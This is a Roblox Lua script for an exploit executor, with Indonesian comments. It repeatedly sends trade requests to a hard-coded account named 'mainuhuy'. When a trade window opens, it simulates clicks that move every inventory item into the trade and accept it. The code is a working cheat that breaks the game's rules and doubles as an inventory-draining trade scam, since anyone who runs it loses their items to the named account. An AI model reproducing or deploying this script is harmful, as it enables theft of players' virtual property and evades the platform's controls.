-- PAKAI INI SEBAGAI GANTINYA (JAUH LEBIH AMAN BUAT LOADSTRING):
if not game:IsLoaded() then 
    repeat task.wait(1) until game:IsLoaded() 
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- SEKARANG TARGET UTAMANYA ADALAH MAINUHUY
local MainAccount = "mainuhuy" 

local RequestRemote = ReplicatedStorage:WaitForChild("\228\186\139\228\187\182"):WaitForChild("\229\133\172\231\148\168"):WaitForChild("\228\186\164\230\152\147"):WaitForChild("\231\148\179\232\175\183\228\186\164\230\152\147")
_G.TradeJendelaKebuka = false

local function klikTombol(btn)
    if btn then
        pcall(function()
            for _, conn in pairs(getconnections(btn.MouseButton1Click)) do conn:Fire() end
            for _, conn in pairs(getconnections(btn.MouseButton1Down)) do conn:Fire() end
            if firesignal then firesignal(btn.MouseButton1Click) end
        end)
        return true
    end
    return false
end

local function cariTombolTeks(listTeks)
    for _, v in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
        if (v:IsA("TextLabel") or v:IsA("TextBox")) and v.Visible then
            for _, teks in ipairs(listTeks) do
                if string.find(string.lower(v.Text), string.lower(teks)) then
                    local btn = v:FindFirstAncestorOfClass("TextButton") or v:FindFirstAncestorOfClass("ImageButton") or v.Parent
                    if btn and (btn:IsA("TextButton") or btn:IsA("ImageButton")) then
                        return btn
                    end
                end
            end
        end
    end
    return nil
end

local function prosesMasukinItem(slot)
    klikTombol(slot)
    task.wait(0.25)
    local tombolPilih = cariTombolTeks({"pilih", "select", "choose", "add"})
    if tombolPilih then
        klikTombol(tombolPilih)
        task.wait(0.25)
        local tombolOk = cariTombolTeks({"konfirmasi", "confirm", "ok"})
        if tombolOk then
            klikTombol(tombolOk)
            task.wait(0.3)
            return true
        end
    end
    return false
end

local function mulaiKurasTas()
    print("[BOT] Menjalankan fungsi kuras otomatis...")
    task.wait(0.5)
    local semuaSlot = {}
    for _, v in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
        if (v:IsA("ImageButton") or v:IsA("TextButton")) and v.Visible then
            if v:FindFirstAncestorOfClass("ScrollingFrame") and v.Size.X.Offset > 10 and v.Name ~= "Pilih" and v.Name ~= "Select" then
                table.insert(semuaSlot, v)
            end
        end
    end
    for _, slot in ipairs(semuaSlot) do
        local scroll = slot:FindFirstAncestorOfClass("ScrollingFrame")
        if scroll then
            pcall(function() scroll.CanvasPosition = Vector2.new(0, slot.Position.Y.Offset or 0) end)
        end
        prosesMasukinItem(slot)
    end
    task.wait(0.5)
    local tombolAccept = cariTombolTeks({"setujui", "accept"})
    if tombolAccept then klikTombol(tombolAccept) end
end

-- JALUR 1: SPAM INVITE KE MAINUHUY
task.spawn(function()
    while true do
        if not _G.TradeJendelaKebuka then
            local targetObj = nil
            for _, p in pairs(Players:GetPlayers()) do
                if string.lower(p.Name) == string.lower(MainAccount) or string.lower(p.DisplayName) == string.lower(MainAccount) then
                    targetObj = p
                    break
                end
            end
            if targetObj then
                RequestRemote:FireServer(targetObj)
            else
                print("[ALERT] Akun utama ("..MainAccount..") gak ada di server!")
            end
        end
        task.wait(3)
    end
end)

-- JALUR 2: MONITOR DETEKSI JENDELA TRADE
task.spawn(function()
    while true do
        local tombolSetuju = cariTombolTeks({"setujui", "accept"})
        local tombolBatal = cariTombolTeks({"membatalkan", "cancel"})
        if tombolSetuju and tombolBatal then
            if not _G.TradeJendelaKebuka then
                _G.TradeJendelaKebuka = true
                task.wait(0.5)
                mulaiKurasTas()
            end
        else
            _G.TradeJendelaKebuka = false
        end
        task.wait(1)
    end
end)
